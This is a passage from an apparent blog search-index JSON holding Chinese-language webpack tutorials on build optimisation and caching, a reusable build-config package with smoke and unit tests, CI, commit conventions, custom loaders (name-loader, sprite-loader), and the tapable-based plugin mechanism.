]\n}\n```\n\n### 执行分包命令\n\n```\nnpm run dll\n```\n\n### 引入分包文件\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head></head>\n  <body>\n    <script src=\"../build/library/library.dll.js\"></script>\n  </body>\n</html>\n```\n\n## 缓存\n\n提升二次构建速度。\n\n### `babel-loader` 开启缓存\n\n```js\n// webpack.config.js\nmodule.exports = {\n  ...\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        use: [\n          {\n            loader: 'babel-loader',\n            options: {\n              cacheDirectory: true //默认false\n            }\n          }\n        ]\n      }\n    ]\n  }\n};\n```\n\n更多[官网](https://www.webpackjs.com/loaders/babel-loader/)\n\n### `terser-webpack-plugin` 开启缓存\n\n```js\n// webpack.config.js\nmodule.exports = {\n  ...\noptimization: {\n    minimizer: [\n      new TerserWebpackPlugin({\n        parallel: true,\n        cache: true // 只在mode为production模式下有效，默认true\n      })\n    ]\n  }\n};\n```\n\n更多[官网](https://webpack.js.org/plugins/terser-webpack-plugin/#cache)\n\n### 使用`hard-source-webpack-plugin`\n\n```js\n// webpack.config.js\nconst HardSourceWebpackPlugin = require('hard-source-webpack-plugin');\nmodule.exports = {\n  ...\n  plugins: [\n    new HardSourceWebpackPlugin()\n  ]\n```\n\n## 缩小构建目标\n\nexclude 与 include 的使用，示例如下：\n\n```js\n// webpack.config.js\nconst path = require('path');\nmodule.exports = {\n  ...\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        // include: path.resolve('src'),\n        use: ['babel-loader']\n      }\n    ]\n  }\n```\n\n## 减少文件搜索范围\n\n- 优化 resolve.modules 配置（减少模块搜索层级）\n- 优化 resolve.mainFields 配置\n- 优化 resolve.extensions 配置\n- 合理使用 alias\n\n```js\n// webpack.config.js\nconst path = require('path');\nmodule.exports = {\n  ...\n  resolve: {\n    alias: {\n      react: path.resolve(__dirname, './node_modules/react/umd/react.production.min.js')\n    }, //直接指定react搜索模块，不设置默认会一层层的搜寻\n    modules: [path.resolve(__dirname, 'node_modules')], //限定模块路径\n    extensions: ['.js'], //限定文件扩展名\n    mainFields: ['main'] //限定模块入口文件名\n  }\n```\n\n## 使用 Tree Shaking 擦除无用的 JS 和 CSS\n\n使用 Tree Shaking 擦除无用的 JS，见之前文章[webpack 进阶用法一](/webpack-advance-1)，本文讲下对 CSS 的处理。\n\n```js\n// webpack.config.js\nconst glob = require('glob');\nconst PurgecssPlugin = require('purgecss-webpack-plugin')\n\nconst PATHS = {\n  src: path.join(__dirname, 'src')\n}\nmodule.exports = {\n  ...\n  plugins: [\n    new PurgecssPlugin({\n      paths: glob.sync(`${PATHS.src}/**/*`,  { nodir: true }),\n    })\n  ]\n```\n\n## 图片压缩\n\n使用基于 Node 库的`imagemin`实现的`image-webpack-loader`。\n\n```js\n// webpack.config.js\nconst glob = require('glob');\nconst PurgecssPlugin = require('purgecss-webpack-plugin')\n\nconst PATHS = {\n  src: path.join(__dirname, 'src')\n}\nmodule.exports = {\n  ...\n  modules: {\n    rules: [\n      {\n        test: /.(png|jpg|gif|jpeg)$/,\n        use: [\n          {\n            loader: 'file-loader',\n            options: {\n              name: '[name]_[hash:8].[ext]'\n            }\n          },\n          {\n            loader: 'image-webpack-loader',\n            options: {\n              mozjpeg: {\n                progressive: true,\n                quality: 65\n              },\n              // optipng.enabled: false will disable optipng\n              optipng: {\n                enabled: false,\n              },\n              pngquant: {\n                quality: [0.65, 0.90],\n                speed: 4\n              },\n              gifsicle: {\n                interlaced: false,\n              },\n              // the webp option will enable WEBP\n              webp: {\n                quality: 75\n              }\n            }\n          }\n        ]\n      }\n    ]\n  }\n```\n\n## 使用动态 Polyfill 服务\n\n原理：识别 User Agent，下发不同的 Polyfill。\n\n### polyfill.io 官方提供的服务\n\n```html\n<script src=\"https://polyfill.io/v3/polyfill.js\"></script>\n```\n\n### 基于官方自建 polyfill 服务\n\n```\n//huayang.qq.com/polyfill_service/v2/polyfill.min.js?unknown=polyfill&features=Promise,Map,Set\n```\n\n# 参考\n\n《极客时间》\n","tags":["webpack"],"categories":["工具"]},{"title":"编写可维护的webpack构建配置","url":"%2Fwebpack-config%2F","content":"\n# 概述\n\n通过多个配置文件管理不同环境的 webpack 配置，并抽离成 npm 包统一管理。业务开发者只需要安装该 npm 包，并且根据具体环境需要引用对应的配置文件即可。[示例源码](https://github.com/jovysun/builder-webpack-jovy)\n\n<!-- more -->\n\n# 详述\n\n## 构建配置包设计\n\n### 通过多个配置文件管理不同环境的 webpack 配置：\n\n基本配置：webpack.base.js\n\n开发配置：webpack.dev.js\n\n生产配置：webpack.prod.js\n\nSSR 配置：webpack.ssr.js\n\n...\n\n### 抽离成一个 npm 包统一管理\n\n- 规范：Git commit 日志、README、ESLint 规范、Semver 规范\n- 质量：冒烟测试、单元测试、测试覆盖率和 CI\n\n## 功能模块设计\n\n![](01.jpg)\n\n## 目录结构设计\n\n![](02.jpg)\n\n## ESLint 规范脚本\n\n使用`eslint-config-airbnb-base`规则库，并用 eslint --fix 自动去除空格。\n\n```js\n// .eslintrc.js\nmodule.exports = {\n  parser: 'babel-eslint',\n  extends: 'airbnb-base',\n  env: {\n    browser: true,\n    node: true\n  }\n};\n```\n\n## 冒烟测试\n\n冒烟测试是指对提交测试的软件在进行详细深入的测试之前而进行的预测试，这种预测试的主要目的是暴露导致软件需重新发布的基本功能失效等严重问题。\n\n### 冒烟测试执行\n\n- 构建是否成功\n- 每次构建 build 目录是否有内容输出\n\n```js\n// test/index.js\nconst path = require('path');\nconst webpack = require('webpack');\nconst rimraf = require('rimraf');\nconst Mocha = require('mocha');\n\nconst mocha = new Mocha({\n  timeout: '10000ms'\n});\n\n// template目录为webpack构建项目demo，用于测试我们的webpack配置能否构建成功\nprocess.chdir(path.join(__dirname, 'template'));\n\nrimraf('./dist', () => {\n  const prodConfig = require('../../lib/webpack.prod');\n  webpack(prodConfig, (err, stats) => {\n    if (err) {\n      console.error(err);\n      process.exit(2);\n    }\n    console.log(\n      stats.toString({\n        colors: true,\n        modules: false,\n        children: false\n      })\n    );\n\n    console.log('webpack compiler success, begin mocha test');\n\n    mocha.addFile(path.join(__dirname, 'html-test.js'));\n    mocha.addFile(path.join(__dirname, 'css-js-test.js'));\n\n    mocha.run();\n  });\n});\n```\n\n是否有 html 文件：\n\n```js\n// html-test.js\nconst glob = require('glob-all');\n\ndescribe('Checking generated html files', () => {\n  it('should generate html files', done => {\n    const files = glob.sync(['./dist/index.html', './dist/search.html']);\n\n    if (files.length > 0) {\n      done();\n    } else {\n      throw new Error('No html files found');\n    }\n  });\n});\n```\n\n是否有 css、js 等文件：\n\n```js\n// css-js-test.js\nconst glob = require('glob-all');\n\ndescribe('Checking generated css js files', () => {\n  it('should generate css js files', done => {\n    const files = glob.sync([\n      './dist/index_*.js',\n      './dist/index_*.css',\n      './dist/search_*.js',\n      './dist/search_*.css'\n    ]);\n\n    if (files.length > 0) {\n      done();\n    } else {\n      throw new Error('No css js files found');\n    }\n  });\n});\n```\n\n## 单元测试与测试覆盖率\n\n单元测试可以选用单纯的测试框架+断言库，如`Mocha+Chai`；也可以选集成测试框架，如`Jasmine`、`Jest`。本次示例用`mocha+assert`：\n\n```js\n// test/unit/webpack-base-test.js\nconst assert = require('assert');\n\ndescribe('webpack.base.js test case', () => {\n  const baseConfig = require('../../lib/webpack.base');\n  // console.log(baseConfig);\n\n  it('entry', () => {\n    assert.equal(\n      baseConfig.entry.index.indexOf(\n        'builder-webpack-jovy/test/smoke/template/src/index/index.js'\n      ) > -1,\n      true\n    );\n    assert.equal(\n      baseConfig.entry.search.indexOf(\n        'builder-webpack-jovy/test/smoke/template/src/search/index.js'\n      ) > -1,\n      true\n    );\n  });\n});\n```\n\n测试覆盖率用 npm 包`nyc`，执行脚本为：\n\n```json\n  \"scripts\": {\n    \"test\": \"nyc ./node_modules/.bin/_mocha\"\n  }\n```\n\n测试结果示例图：\n![](03.jpg)\n\n## 持续集成\n\n本次以 github 上最流行的 CI 工具`Travis CI`为例。\n\n### 接入 Travis CI\n\n1. https://travis-ci.org/ 使用 GitHub 账号登录\n2. 在 https://travis-ci.org/account/repositories 为项目开启\n3. 项目根目录下新增 `.travis.yml`\n\n### 编写`.travis.yml`\n\n```js\n// .travis.yml\nlanguage: node_js\n\nsudo: false\n\ncache:\n  apt: true\n  directories:\n    - node_modules\n\nnode_js: stable\n\ninstall:\n  - npm install -D\n  - cd ./test/smoke/template\n  - npm install -D\n  - cd ../../../\n\nscripts:\n  - npm run test\n```\n\n## 发布到 npm\n\n### 添加用户\n\n```shell\nnpm adduser\n```\n\n### 升级版本\n\n```shell\n# 升级补丁版本号\nnpm version patch\n# 升级小版本号\nnpm version minor\n# 升级大版本号\nnpm version major\n```\n\n### 发布版本\n\n```shell\nnpm publish\n```\n\n## Git 规范和 Changelog 生成\n\n### 良好的 Git commit 规范优势：\n\n- 加快 Code Review 的流程\n- 根据 Git Commit 的元数据生成 Changelog\n- 后续维护者可以知道 Feature 被修改的原因\n\n### 日志规范\n\n推荐用 angular 的 git commit 日志规范：\n\nCommit Message 格式:\n\n```\n<type>(<scope>): <subject>\n<空行>\n<body>\n<空行>\n<footer>\n```\n\n可以看出分为三个部分，头部，主体，底部；\n\nheader，`<type>(<scope>): <subject>`包括了三个节点：\n\n    type 类型，修改的类型级别\n        feat：新功能（feature）\n        fix：修补bug\n        docs：文档（documentation）\n        style： 格式（不影响代码运行的变动）\n        refactor：重构（即不是新增功能，也不是修改bug的代码变动）\n        test：增加测试\n        chore：构建过程或辅助工具的变动\n    scope 修改范围\n    主要是这次修改涉及到的部分，最好简单的概括\n    subject 修改的副标题\n    主要是具体修改的加点\n\nbody，修改的主体标注\n\nfooter，里的主要放置不兼容变更和 Issue 关闭的信息，\n这些东西由于我们书写代码本身就会经常性的提交，所以如果每次都这样书写的确是挺烦人的，所以我目前建议自己采用相同的但是更加简单的方式来完成\n\n### Changelog 生成\n\n安装`conventional-changelog-cli`，配置 scripts：\n\n```json\n  \"scripts\": {\n    \"changelog\": \"conventional-changelog -p angular -i CHANGELOG.md -s -r 0\"\n  }\n```\n\n生成的效果示例如下：\n![](04.jpg)\n\n## 增加 precommit\n\n安装`husky`，配置 package.json：\n\n```json\n  \"husky\": {\n    \"hooks\": {\n      \"pre-commit\": \"npm test\",\n      \"pre-push\": \"npm test\"\n    }\n  }\n```\n\n这样每次执行`git commit`和`git push`命令时都会先执行`test`命令进行单元测试。\n\n# 参考\n\nhttps://segmentfault.com/a/1190000011224170?utm_source=tag-newest\n\n《极客时间》","tags":["webpack"],"categories":["工具"]},{"title":"编写一个webpack的loader","url":"%2Fwebpack-loader%2F","content":"\n# 概述\n\n对于 loader，我们用了很多，熟悉的有 `css-loader`、`file-loader` 等。但是 loader 的机制是什么，基本的 loader 结构是怎样的，如何搭建一个 loader 开发调试环境，如何自己编写一个 loader，异步 loader 怎么处理，怎么在 loader 中运用第三方 npm 包。本文将对以上问题进行讲解。\n\n<!-- more -->\n\n# 详述\n\nloader 只是一个导出为函数的 JavaScript 模块。loader 是用来加载处理各种形式的资源，就像工厂生产线中的一道工序，输入资源，加工处理后再输出资源。\n\nloader 类似于其他构建工具中“任务(task)”，并提供了处理前端构建步骤的强大方法。loader 可以将文件从不同的语言（如 TypeScript）转换为 JavaScript，或将内联图像转换为 data URL。loader 甚至允许你直接在 JavaScript 模块中 import CSS 文件！\n\n[源码分析](https://segmentfault.com/a/1190000018450503)\n\n## 最简实现\n\n```js\n// demo-loader\nmodule.exports = function(source) {\n  return source;\n};\n```\n\n## 多 loader 的执行顺序\n\n多个 loader 是链式调用，顺序是从后到前。例如下面示例：\n\n```js\n// webpack.config.js\nmodule.exports = {\n  ...\n  module: {\n    rules: [\n      {\n        test: /.less$/,\n        use: [\n          'style-loader',\n          'css-loader',\n          'less-loader'\n        ]\n      }\n    ]\n  }\n}\n```\n\n执行顺序是`less-loader` > `css-loader` > `style-loader`。\n\n## loader-runner\n\nwebpack 的核心依赖包，用它来执行 loader。我们可以利用它在不用搭建完整 webpack 环境下进行 loader 的开发和调试。\n\n使用方式：\n\n```js\nconst { runLoaders } = require('loader-runner');\n\nrunLoaders(\n  {\n    resource: '/abs/path/to/file.txt?query',\n    // String: 资源的绝对路径 (可添加查询字符串)\n\n    loaders: ['/abs/path/to/loader.js?query'],\n    // String[]: loaders的绝对路径 (可添加查询字符串)\n    // {loader, options}[]: 包含配置项的loaders对象的绝对路径\n\n    context: { minimize: true },\n    // 附加loader上下文作为基本上下文\n\n    readResource: fs.readFile.bind(fs)\n    // 一个读取资源的函数\n    // Must have signature function(path, function(err, buffer))\n  },\n  function(err, result) {\n    // err: Error?\n    // result.result: Buffer | String\n    // The result\n    // result.resourceBuffer: Buffer\n    // The raw resource as Buffer (useful for SourceMaps)\n    // result.cacheable: Bool\n    // Is the result cacheable or do it require reexecution?\n    // result.fileDependencies: String[]\n    // An array of paths (files) on which the result depends on\n    // result.contextDependencies: String[]\n    // An array of paths (directories) on which the result depends on\n  }\n);\n```\n\n## loader-utils\n\nwebpack loaders 的工具包，提供 `getOptions`、`parseQuery` 等工具方法。使用示例如下：\n\n```js\nconst loaderUtils = require('loader-utils');\n\nmodule.exports = function(source) {\n  // getOptions示例\n  const { name } = loaderUtils.getOptions(this);\n  // parseQuery示例\n  const params = loaderUtils.parseQuery(this.resourceQuery); // resource: `file?param1=foo`\n  if (params.param1 === 'foo') {\n    // do something\n  }\n};\n```\n\n[更多介绍](https://github.com/webpack/loader-utils)\n\n## 同步 loader 与异步 loader\n\n同步 loader 的返回值可以用 `return` 也可以用 `this.callback()`，示例如下：\n\n```js\n// 同步方式一：\nmodule.exports = function(source) {\n  // 业务处理逻辑\n\n  return source;\n};\n\n// 同步方式二：\nmodule.exports = function(source) {\n  // 业务处理逻辑\n\n  this.callback(null, source, map, meta);\n};\n```\n\n```js\n// 异步方式：\nmodule.exports = function(input) {\n  const callback = this.async();\n  // 业务处理逻辑\n\n  callback(null, source);\n};\n```\n\n同步`this.callback()`异步`callback()`的参数类型相同，如下：\n\n```js\n// callback的参数类型\ncallback(\n  err: Error | null,\n  content: string | Buffer,\n  sourceMap?: SourceMap,\n  meta?: any\n);\n```\n\n## loader 中使用缓存\n\nwebpack 中默认开启 loader 缓存，如果需要关闭缓存，可以如下设置：\n\n```js\nthis.cacheable(false);\n```\n\n## 编写 name-loader\n\n实现将源数据中的 [name] 直接替换为 loader 选项中设置的 name。然后返回包含导出文本的 JavaScript 模块。\n\n### 准备工作\n\n#### 目录结构\n\n![](01.jpg)\n\n#### 工具包安装\n\n```shell\nnpm i loader-runner loader-utils -S\n```\n\n#### 源文件 index.html\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\n    <title>Document</title>\n  </head>\n  <body>\n    <h1>Hey [name]!</h1>\n  </body>\n</html>\n```\n\n### 代码编写\n\n#### name-loader\n\n```js\n// name-loader.js\nconst { getOptions } = require('loader-utils');\n\nmodule.exports = function loader(source) {\n  const options = getOptions(this);\n\n  source = source.replace(/\\[name\\]/g, options.name);\n\n  return `module.exports = ${JSON.stringify(source)}`;\n};\n```\n\n#### name-loader 调试脚本：\n\n```js\n// test-name-loader.js\nconst path = require('path');\nconst fs = require('fs');\nconst { runLoaders } = require('loader-runner');\n\nrunLoaders(\n  {\n    resource: path.join(__dirname, './src/name/index.html'),\n    loaders: [\n      {\n        loader: path.join(__dirname, './loaders/name-loader.js'),\n        options: {\n          name: 'Jovy'\n        }\n      }\n    ],\n    context: { minimize: true },\n    readResource: fs.readFile.bind(fs)\n  },\n  function(err, result) {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    console.log('runLoaders result: ', result);\n  }\n);\n```\n\n### 执行调试脚本：\n\n```shell\nH:\\workspace\\webpack\\my-loader>npm run test:name\n\n> my-loader@1.0.0 test:name H:\\workspace\\webpack\\my-loader\n> node test-name-loader.js\n\n\nrunLoaders result:  { result:\n   [ 'module.exports = \"<!DOCTYPE html>\\\\r\\\\n<html lang=\\\\\"en\\\\\">\\\\r\\\\n<head>\\\\r\\\\n  <meta charset=\\\\\"UTF-8\\\\\">\\\\r\\\\n  <meta name=\\\\\"viewport\\\\\" content=\\\\\"width=device-width, initial-scale=1.0\\\\\">\\\\r\\\\n  <meta http-equiv=\\\\\"X-UA-Compatible\\\\\" content=\\\\\"ie=edge\\\\\">\\\\r\\\\n  <title>Document</title>\\\\r\\\\n</head>\\\\r\\\\n<body>\\\\r\\\\n  <h1>Hey Jovy!</h1>\\\\r\\\\n</body>\\\\r\\\\n</html>\"' ],\n  resourceBuffer:\n   <Buffer 3c 21 44 4f 43 54 59 50 45 20 68 74 6d 6c 3e 0d 0a 3c 68 74 6d 6c 20 6c 61 6e 67 3d 22 65 6e 22 3e 0d 0a 3c 68 65 61 64 3e 0d 0a 20 20 3c 6d 65 74 61 ... >,\n  cacheable: true,\n  fileDependencies:\n   [ 'H:\\\\workspace\\\\webpack\\\\my-loader\\\\src\\\\name\\\\index.html' ],\n  contextDependencies: [] }\n```\n\n## 编写 sprite-loader\n\n在上一个 loader 编写的环境中我们再开发一个 loader，实现自动将 css 中引用的小图片合并成雪碧图并生成新的 css 文件。\n\n### 准备工作\n\n#### 目录结构：\n\n![](02.jpg)\n\n#### spritesmith：\n\n雪碧图合并功能选用第三方 node 模块[spritesmith](https://www.npmjs.com/package/spritesmith)，生成雪碧图 Buffer 和坐标映射。使用示例如下：\n\n```js\n// Load in dependencies\nvar Spritesmith = require('spritesmith');\n\n// Generate our spritesheet\nvar sprites = ['fork.png', 'github.png', 'twitter.png'];\nSpritesmith.run({ src: sprites }, function handleResult(err, result) {\n  result.image; // Buffer representation of image\n  result.coordinates; // Object mapping filename to {x, y, width, height} of image\n  result.properties; // Object with metadata about spritesheet {width, height}\n});\n```\n\n#### 源文件 index.css\n\n```css\n/* src/sprite/index.css */\n.img1 {\n  background: url(./images/1.jpg?__sprite);\n}\n.img2 {\n  background: url(./images/2.jpg?__sprite);\n}\n```\n\n### 代码编写\n\n#### sprite-loader\n\n```js\n// loaders/sprite-loader.js\nconst fs = require('fs');\nconst path = require('path');\nconst Spritesmith = require('spritesmith');\n\nmodule.exports = function loader(source) {\n  const callback = this.async();\n  const imgs = source.match(/url\\((\\S*)\\?__sprite\\)/g);\n  let matchedImgs = [];\n\n  for (let i = 0; i < imgs.length; i++) {\n    const img = imgs[i].match(/url\\((\\S*)\\?__sprite\\)/)[1];\n    matchedImgs.push(path.join(process.cwd(), `/src/sprite/${img}`));\n  }\n\n  Spritesmith.run({ src: matchedImgs }, function handleResult(err, result) {\n    let spritePath = path.join(process.cwd(), 'dist/sprite.jpg');\n    fs.writeFileSync(spritePath, result.image);\n\n    let imgsData = [];\n    Object.keys(result.coordinates).forEach(key => {\n      imgsData.push(result.coordinates[key]);\n    });\n\n    imgs.forEach((img, index) => {\n      source = source.replace(\n        imgs[index],\n        `url(\"dist/sprite.jpg\") ${-imgsData[index].x}px ${-imgsData[index].y}px`\n      );\n    });\n\n    callback(null, source);\n  });\n};\n```\n\n#### sprite-loader 调试脚本\n\n```js\n// src/test-sprite-loader.js\nconst path = require('path');\nconst fs = require('fs');\nconst { runLoaders } = require('loader-runner');\n\nrunLoaders(\n  {\n    resource: path.join(__dirname, './src/sprite/index.css'),\n    loaders: [path.join(__dirname, './loaders/sprite-loader.js')],\n    context: { minimize: true },\n    readResource: fs.readFile.bind(fs)\n  },\n  function(err, result) {\n    if (err) {\n      console.error(err);\n      return;\n    }\n\n    fs.writeFileSync(\n      path.join(process.cwd(), 'dist/index.css'),\n      result.resourceBuffer\n    );\n\n    console.log('runLoaders result: ', result);\n  }\n);\n```\n\n### 执行调试脚本\n\n```shell\nH:\\workspace\\webpack\\my-loader>npm run test:sprite\n\n> my-loader@1.0.0 test:sprite H:\\workspace\\webpack\\my-loader\n> node test-sprite-loader.js\n\nrunLoaders result:  { result:\n   [ '.img1{\\r\\n  background: url(\"dist/sprite.jpg\") -777px 0px;\\r\\n}\\r\\n.img2{\\r\\n  background: url(\"dist/sprite.jpg\") 0px 0px;\\r\\n}' ],\n  resourceBuffer:\n   <Buffer 2e 69 6d 67 31 7b 0d 0a 20 20 62 61 63 6b 67 72 6f 75 6e 64 3a 20 75 72 6c 28 2e 2f 69 6d 61 67 65 73 2f 31 2e 6a 70 67 3f 5f 5f 73 70 72 69 74 65 29 ... >,\n  cacheable: true,\n  fileDependencies:\n   [ 'H:\\\\workspace\\\\webpack\\\\my-loader\\\\src\\\\sprite\\\\index.css' ],\n  contextDependencies: [] }\n```\n\n## 编写 loader 用法准则及注意事项\n\n### 用法准则\n\n- 简单易用。\n- 使用链式传递。\n- 模块化的输出。\n- 确保无状态。\n- 使用 loader utilities。\n- 记录 loader 的依赖。\n- 解析模块依赖关系。\n- 提取通用代码。\n- 避免绝对路径。\n- 使用 peer dependencies。\n\n### 注意事项\n\n如果该 loader 是最终执行 loader（如 file-loader、style-loader 等），那么返回值应该是字符串，包含导出文本的 JavaScript 模块；如果该 loader 不是最终执行 loader（如 css-loader、sass-loader），那么返回值应该是 Buffer，将作为链式处理的 loader 的 source。\n\n## 自定义 loader 的使用\n\n只有一点需要注意，就是通过 `resolveLoader` 配置项指定 loader 的搜寻顺序。\n\n### 使用示例\n\n```js\nconst path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\nconst { CleanWebpackPlugin } = require('clean-webpack-plugin');\nconst HotModuleReplacementPlugin = require('webpack')\n  .HotModuleReplacementPlugin;\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    path: path.join(__dirname, 'dist'),\n    filename: 'bundle.js'\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.html$/,\n        use: [\n          {\n            loader: 'name-loader',\n            options: {\n              name: 'Jovy'\n            }\n          }\n        ]\n      },\n      {\n        test: /\\.css$/,\n        loader: ['style-loader', 'css-loader', 'sprite-loader']\n      },\n      {\n        test: /\\.jpg$/,\n        loader: [\n          {\n            loader: 'file-loader',\n            options: {\n              name(file) {\n                if (process.env.NODE_ENV === 'development') {\n                  return '[path][name].[ext]';\n                }\n\n                return '[contenthash:8].[ext]';\n              }\n            }\n          }\n        ]\n      }\n    ]\n  },\n  devServer: {\n    contentBase: path.join(__dirname, 'dist'),\n    compress: true,\n    port: 9000,\n    hot: true\n  },\n  // 指定loader搜寻顺序\n  resolveLoader: {\n    modules: [path.join(__dirname, './loaders'), 'node_modules']\n  },\n  plugins: [\n    new CleanWebpackPlugin(),\n    new HtmlWebpackPlugin({\n      template: path.join(__dirname, `src/index.html`),\n      filename: `index.html`\n    }),\n    new HotModuleReplacementPlugin()\n  ]\n};\n```\n\n### 效果展示\n\n![](03.jpg)\n\n# 参考\n\nhttps://webpack.docschina.org/contribute/writing-a-loader/\n\nhttps://segmentfault.com/a/1190000014205729\n\n《极客时间》\n","tags":["webpack"],"categories":["工具"]},{"title":"webpack插件机制","url":"%2Fwebpack-plugin-mechanism%2F","content":"\n# 概述\n想要编写一个webpack的插件demo很简单，只要按照官方给的范式就好。想要实际编写一个生产用的插件，那就得深入了解插件机制。例如，apply方法干嘛用的，有哪些周期钩子，同步异步的钩子怎么触及（tap）。\n<!-- more -->\n\n# 详述\n## apply方法\n\n一个框架（对象）想要具有良好的扩展性，通常都会暴露一个接口，通过这个入口方法来整合第三方提供的功能模块，这就是插件系统。例如 jQuery 提供的`extend`方法，Vue 提供的`install`方法，webpack 提供的`apply`方法。因此，编写 webpack 插件需要定义 apply 方法。\n\n## tapable\n插件不同于 loader，loader 是针对具体模块的处理，而插件是针对 webpack 整个编译过程，因此，我们需要 webpack 的生命周期函数，通常也叫钩子 hooks。webpack 中为插件提供钩子机制的是一个抽离出来的核心工具库 tapable，它提供了抽象类Tapble和各种钩子类：\n\n```js\n// node_modules/tapable/README.md\nconst {\n  SyncHook,\n  SyncBailHook,\n  SyncWaterfallHook,\n  SyncLoopHook,\n  AsyncParallelHook,\n  AsyncParallelBailHook,\n  AsyncSeriesHook,\n  AsyncSeriesBailHook,\n  AsyncSeriesWaterfallHook\n} = require('tapable');\n```\n### 钩子类使用示例\n\n定一个类，申明具体类型的钩子实例：\n``` js\nclass Car {\n\tconstructor() {\n\t\tthis.hooks = {\n\t\t\taccelerate: new SyncHook([\"newSpeed\"]),\n\t\t\tbrake: new SyncHook(),\n\t\t\tcalculateRoutes: new AsyncParallelHook([\"source\", \"target\", \"routesList\"])\n\t\t};\n\t}\n\n\t/* ... */\n}\n```\n同步钩子使用`tap`方法添加消费者：\n``` js\nconst myCar = new Car();\n\n// Use the tap method to add a consument\nmyCar.hooks.brake.tap(\"WarningLampPlugin\", () => warningLamp.on());\n\n// 接受传参\nmyCar.hooks.accelerate.tap(\"LoggerPlugin\", newSpeed => console.log(`Accelerating to ${newSpeed}`));\n```\n异步钩子，除了用`tap`还可以用`tapPromise`和`tapAsync`方法添加消费者：\n``` js\nmyCar.hooks.calculateRoutes.tapPromise(\"GoogleMapsPlugin\", (source, target, routesList) => {\n\t// return a promise\n\treturn google.maps.findRoute(source, target).then(route => {\n\t\troutesList.add(route);\n\t});\n});\nmyCar.hooks.calculateRoutes.tapAsync(\"BingMapsPlugin\", (source, target, routesList, callback) => {\n\tbing.findRoute(source, target, (err, route) => {\n\t\tif(err) return callback(err);\n\t\troutesList.add(route);\n\t\t// call the callback\n\t\tcallback();\n\t});\n});\n\n// You can still use sync plugins\nmyCar.hooks.calculateRoutes.tap(\"CachedRoutesPlugin\", (source, target, routesList) => {\n\tconst cachedRoute = cache.get(source, target);\n\tif(cachedRoute)\n\t\troutesList.add(cachedRoute);\n})\n```\n声明这些钩子的类可以用`call`、`promise`或者`callAsync`调用他们：\n\n``` js\nclass Car {\n\t/* ... */\n\n\tsetSpeed(newSpeed) {\n\t\tthis.hooks.accelerate.call(newSpeed);\n\t}\n\n\tuseNavigationSystemPromise(source, target) {\n\t\tconst routesList = new List();\n\t\treturn this.hooks.calculateRoutes.promise(source, target, routesList).then(() => {\n\t\t\treturn routesList.getRoutes();\n\t\t});\n\t}\n\n\tuseNavigationSystemAsync(source, target, callback) {\n\t\tconst routesList = new List();\n\t\tthis.hooks.calculateRoutes.callAsync(source, target, routesList, err => {\n\t\t\tif(err) return callback(err);\n\t\t\tcallback(null, routesList.getRoutes());\n\t\t});\n\t}\n}\n```\n[更多介绍](https://github.com/webpack/tapable)\n\n## Compiler\n\nCompiler 模块是 webpack 的支柱引擎，它通过 CLI 或 Node API 传递的所有选项，创建出一个 compilation 实例。它扩展(extend)自 Tapable 类，以便注册和调用插件。大多数面向用户的插件首先会在 Compiler 上注册。\n\ncompiler 对象是 webpack 的编译器对象，compiler 对象会在启动 webpack 的时候被一次性的初始化，compiler 对象中包含了所有 webpack 可自定义操作的配置，例如 loader 的配置，plugin 的配置，entry 的配置等各种原始 webpack 配置等，在 webpack 插件中的自定义子编译流程中，我们肯定会用到 compiler 对象中的相关配置信息，我们相当于可以通过 compiler 对象拿到 webpack 的主环境所有的信息。\n\nCompiler 对象扩展自 Tapable 类，提供了编译器的整个[生命周期钩子](https://webpack.docschina.org/api/compiler-hooks/)，常用的有`done`（编译(compilation)完成）、`emit`（生成资源到 output 目录之前）等。\n\n## Compilation\n\nCompilation 模块会被 Compiler 用来创建新的编译（或新的构建）。compilation 实例能够访问所有的模块和它们的依赖（大部分是循环依赖）。它会对应用程序的依赖图中所有模块进行逐个编译(literal compilation)。在编译阶段，模块会被加载(loaded)、封存(sealed)、优化(optimized)、分块(chunked)、哈希(hashed)和重新创建(restored)。\n\nCompilation 类扩展(extend)自 Tapable，提供了一次编译的[生命周期钩子](https://webpack.docschina.org/api/compilation-hooks/)。\n\n## 事件钩子添加消费者\n\n对于各种钩子的触及，有三个 API：同步的`tap`，异步的`tapAsync`和`tapPromise`。使用示例如下：\n\n### tap\n\n```js\nclass HelloCompilationPlugin {\n  apply(compiler) {\n    // tap(触及) 到 compilation hook，而在 callback 回调时，会将 compilation 对象作为参数，\n    compiler.hooks.compilation.tap('HelloCompilationPlugin', compilation => {\n      // 现在，通过 compilation 对象，我们可以 tap(触及) 到各种可用的 hooks 了\n      compilation.hooks.optimize.tap('HelloCompilationPlugin', () => {\n        console.log('正在优化资源。');\n      });\n    });\n  }\n}\n\nmodule.exports = HelloCompilationPlugin;\n```\n\n### tapAsync\n\n在我们使用 tapAsync 方法 tap 插件时，我们需要调用 callback，此 callback 将作为最后一个参数传入函数。\n\n```js\nclass HelloAsyncPlugin {\n  apply(compiler) {\n    compiler.hooks.emit.tapAsync(\n      'HelloAsyncPlugin',\n      (compilation, callback) => {\n        // 做一些异步的事情……\n        setTimeout(function() {\n          console.log('Done with async work...');\n          callback();\n        }, 1000);\n      }\n    );\n  }\n}\n\nmodule.exports = HelloAsyncPlugin;\n```\n\n### tapPromise\n\n在我们使用 tapPromise 方法 tap 插件时，我们需要返回一个 promise，此 promise 将在我们的异步任务完成时 resolve。\n\n```js\nclass HelloAsyncPlugin {\n  apply(compiler) {\n    compiler.hooks.emit.tapPromise('HelloAsyncPlugin', compilation => {\n      // 返回一个 Promise，在我们的异步任务完成时 resolve……\n      return new Promise((resolve, reject) => {\n        setTimeout(function() {\n          console.log('异步工作完成……');\n          resolve();\n        }, 1000);\n      });\n    });\n  }\n}\n\nmodule.exports = 